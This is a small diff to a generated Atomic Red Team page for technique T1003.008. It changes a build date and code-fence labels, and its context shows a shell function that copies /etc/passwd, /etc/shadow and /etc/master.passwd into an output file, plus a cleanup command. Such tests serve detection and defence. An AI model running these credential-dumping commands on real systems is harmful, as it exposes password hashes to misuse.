@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1003.008"
 attack_technique_name: "OS Credential Dumping: /etc/passwd, /etc/master.passwd and /etc/shadow"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.008/T1003.008.yaml"
-build_date: "2026-04-26 14:38:39"
+build_date: "2026-04-26 17:02:12"
 executor: "sh"
 aliases:
   - "f5aa6543-6cb2-4fae-b9c2-b96e14721713"
@@ -52,7 +52,7 @@ Dump /etc/passwd, /etc/master.passwd and /etc/shadow using sh builtins
 
 ### Command
 
-```sh
+```bash
 testcat(){ (while read line; do echo $line >> #{output_file}; done < $1) }
 [ "$(uname)" = 'FreeBSD' ] && testcat /etc/master.passwd
 testcat /etc/passwd
@@ -61,7 +61,7 @@ testcat /etc/shadow
 
 ### Cleanup
 
-```sh
+```bash
 rm -f #{output_file}
 ```
 
